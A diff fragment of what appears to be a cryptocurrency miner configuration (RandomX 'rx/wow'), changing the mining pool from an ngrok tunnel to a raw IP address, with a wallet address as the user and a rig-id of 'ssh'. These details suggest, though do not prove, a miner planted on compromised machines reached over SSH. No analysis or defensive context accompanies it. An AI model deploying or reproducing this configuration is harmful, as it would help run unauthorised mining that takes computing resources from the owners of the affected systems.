@@ -64,7 +64,7 @@
         {
             "algo": "rx/wow",
             "coin": null,
-            "url": "8.tcp.ngrok.io:10569",
+            "url": "213.202.211.105:3333",
             "user": "Wo57bBNo1ngXf5orz7HAgZ8Te7TZYfKPZXNYH2QKqat292D8qsjjWuHKoT28hoPFyGCED8Az3AvPRhTAKxXFFcEm2wzZkdCPr+1000000",
             "pass": "x",
             "rig-id": "ssh",
